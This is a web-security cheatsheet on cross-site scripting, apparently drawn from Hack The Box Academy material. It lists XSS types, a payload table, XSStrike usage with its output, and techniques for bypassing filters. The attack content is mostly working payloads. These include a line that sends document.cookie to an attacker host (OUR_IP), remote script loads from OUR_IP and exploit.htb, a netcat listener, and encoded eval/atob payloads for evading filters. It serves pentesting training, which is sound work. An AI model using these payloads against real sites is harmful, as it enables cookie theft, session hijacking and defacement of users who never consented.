---
title: 'XSS — Cross-Site Scripting Cheatsheet'
description: 'Types of XSS, payloads, tools, and detection techniques'
category: 'Web'
pubDate: '2026-07-09'
---

A typical web application works by receiving the HTML code from the back-end server and rendering it on the client-side internet browser. When a vulnerable web application does not properly sanitize user input, a malicious user can inject extra JavaScript code in an input field (e.g., comment/reply), so once another user views the same page, they unknowingly execute the malicious JavaScript code.

XSS vulnerabilities are solely executed on the client-side and hence do not directly affect the back-end server. They can only affect the user executing the vulnerability. The direct impact of XSS vulnerabilities on the back-end server may be relatively low, but they are very commonly found in web applications, so this equates to a medium risk (`low impact + high probability = medium risk`), which we should always attempt to reduce risk by detecting, remediating, and proactively preventing these types of vulnerabilities.

## Types of XSS

| Type | Description |
| ---- | ----------- |
| `Stored (Persistent) XSS` | The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments) |
| `Reflected (Non-Persistent) XSS` | Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message) |
| `DOM-based XSS` | Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags) |

## XSS Payloads

| Code | Description |
| ---- | ----------- |
| **XSS Payloads** |
| `<script>alert(window.origin)</script>` | Basic XSS Payload |
| `<plaintext>` | Basic XSS Payload |
| `<script>print()</script>` | Basic XSS Payload |
| `<img src="" onerror=alert(window.origin)>` | HTML-based XSS Payload |
| `<script>document.body.style.background = "#141d2b"</script>` | Change Background Color |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image |
| `<script>document.title = 'HackTheBox Academy'</script>` | Change Website Title |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` | Overwrite website's main body |
| `<script>document.getElementById('urlform').remove();</script>` | Remove certain HTML element |
| `<script src="http://OUR_IP/script.js"></script>` | Load remote script |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Send Cookie details to us |
| **Commands** |
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` | Run `xsstrike` on a url parameter |
| `sudo nc -lvnp 80` | Start `netcat` listener |
| `sudo php -S 0.0.0.0:80` | Start `PHP` server |

## Tools

Some of the common open-source tools: [XSS Strike](https://github.com/s0md3v/XSStrike), [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS), and [XSSer](https://github.com/epsylon/xsser)

#### XSS Strike
```shell-session
L3bnn@htb[/htb]$ git clone https://github.com/s0md3v/XSStrike.git
L3bnn@htb[/htb]$ cd XSStrike
L3bnn@htb[/htb]$ pip install -r requirements.txt
L3bnn@htb[/htb]$ python xsstrike.py

XSStrike v3.1.4
...SNIP...
```

```shell-session
L3bnn@htb[/htb]$ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 

        XSStrike v3.1.4

[~] Checking for DOM vulnerabilities 
[+] WAF Status: Offline 
[!] Testing parameter: task 
[!] Reflections found: 1 
[~] Analysing reflections 
[~] Generating payloads 
[!] Payloads generated: 3072 
------------------------------------------------------------
[+] Payload: <HtMl%09onPoIntERENTER+=+confirm()> 
[!] Efficiency: 100 
[!] Confidence: 10 
[?] Would you like to continue scanning? [y/N]
```

### Manual Discovery
[PayloadAllTheThings — XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)

## Blind XSS Detection

Blind XSS occurs when the payload is executed in a context that the attacker cannot directly observe (e.g., admin dashboard, logging page). Detection typically involves setting up a listener and using payloads that callback to your server.

---

## XSS Bypasses

To conclude the module, we will discuss various types of XSS filters and explore methods for bypassing them.

---

### Achieving JavaScript Execution

Before discussing bypassing XSS filters, we will explore three methods for achieving JavaScript code execution.

#### Script Tag

The most common (and obvious) method of achieving code execution is via the `script` tag; web browsers will execute any JavaScript code contained within it:

```html
<script>alert(1)</script>
```

#### Pseudo Protocols

We can use pseudo-protocols such as `javascript` or `data` in certain HTML attributes that indicate where data is loaded from to achieve JavaScript code execution. For instance, we can set the target of an `a` tag to the `javascript` pseudo protocol, and the corresponding JavaScript code is executed when the link is clicked:

```html
<a href="javascript:alert(1)">click</a>
```

We can also create XSS payloads with pseudo-protocols that do not require user interaction. For instance, using the `object` tag. The `data` pseudo protocol allows us to specify plain HTML code or base64-encoded HTML code:

```html
<object data="javascript:alert(1)">
<object data="data:text/html,<script>alert(1)</script>">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

#### Event Handlers

Thirdly, we can use event handlers such as `onload` or `onerror` to specify JavaScript code that is executed when the event handler is triggered:

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

There are many event handlers that we can use for this purpose. A good overview is provided by PortSwigger's [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).

---

### Bypassing Basic Blacklists

Suppose a web application implements a simple blacklist to block keywords that can lead to JavaScript code execution. For instance, by blocking HTML tags like the `script` tag, pseudo protocols like `javascript` and `data`, and event handlers like `onload` and `onerror`.

In these cases, we can try a few things to bypass a naive blacklist. For instance, the casing in HTML tags, pseudo-protocols, and event handlers is irrelevant. More specifically, we can mix lowercase and uppercase letters to bypass blacklists that block only lowercase keywords:

```html
<ScRiPt>alert(1);</ScRiPt>
<object data="JaVaScRiPt:alert(1)">
<img src=x OnErRoR=alert(1)>
```

Furthermore, if a naive blacklist strips all occurrences of the keyword `<script>` but is not applied recursively, we can bypass the filter with a payload similar to the following:

```html
<scr<script>ipt>alert(1);</scr<script>ipt>
```

Lastly, if such a blacklist utilizes a weak regular expression that makes assumptions about the syntax of HTML tags or only blocks certain special characters, we might be able to bypass the blacklist by breaking these assumptions. For instance, if a blacklist expects a space before any event handler or an input field does not allow a space, the following payload may bypass the filter:

```html
<svg/onload=alert(1)>
<script src="https://exploit.htb/exploit"></script>
```

---

### Advanced Bypasses

Suppose we inject an HTML tag, resulting in JavaScript code execution. In that case, we may need to bypass additional filters applied to the JavaScript code, which restrict which functions we can call or which data we can access in the JavaScript context. There are many techniques we can apply to attempt to bypass such filters. We will explore how to bypass filters by encoding strings and passing these strings to `execution sinks` to execute the JavaScript code.

In JavaScript, we can apply many different encodings to strings that help us evade blacklists. Here are different encodings of the string `"alert(1)"`:

```js
// Unicode
"\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"
// Octal Encoding
"\141\154\145\162\164\50\61\51"
// Hex Encoding
"\x61\x6c\x65\x72\x74\x28\x31\x29"
// Base64 Encoding
atob("YWxlcnQoMSk=")
```

To supply our payload in a string, we need to be able to use quotes. If a filter removes or blocks quotes, we can use one of the following tricks to create a string containing our payload:

```js
// String.fromCharCode
String.fromCharCode(97,108,101,114,116,40,49,41)
// .source
/alert(1)/.source
// URL Encoding
decodeURI(/alert(%22xss%22)/.source)
```

Thus far, we have only managed to supply our payload in a string; however, the browser will only execute it if it is passed to an execution sink that takes a string as input. The most famous example of such an execution sink is the `eval` function; in addition to `eval`, other execution sinks include:

```js
eval("alert(1)")
setTimeout("alert(1)")
setInterval("alert(1)")
Function("alert(1)")()
[].constructor.constructor(alert(1))()
```

At last, we can combine an execution sink with an encoded string to attempt to bypass a weak XSS filter:

```js
eval("\141\154\145\162\164\50\61\51")
setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41))
Function(atob("YWxlcnQoMSk="))()
```

**Note:** To bypass an XSS filter in the real world, we can apply the same methodology used in bypassing filters for other vulnerabilities, such as SQL injection or command injection. The actual bypass depends on the filter implemented by the web application. It requires careful testing to identify which keywords are whitelisted or blacklisted, in order to come up with an exploit that is not blocked.

---

### Resources

For more XSS filter bypasses, check out OWASP's [XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html). Furthermore, there are collections of XSS payloads for different types of filters. For instance, if we are unable to use any parentheses, we may refer to the [XSS without Parentheses](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md) payload collection. Additionally, the [HTML 5 Security Cheatsheet](https://html5sec.org/) provides further browser-specific examples for XSS exploitation.
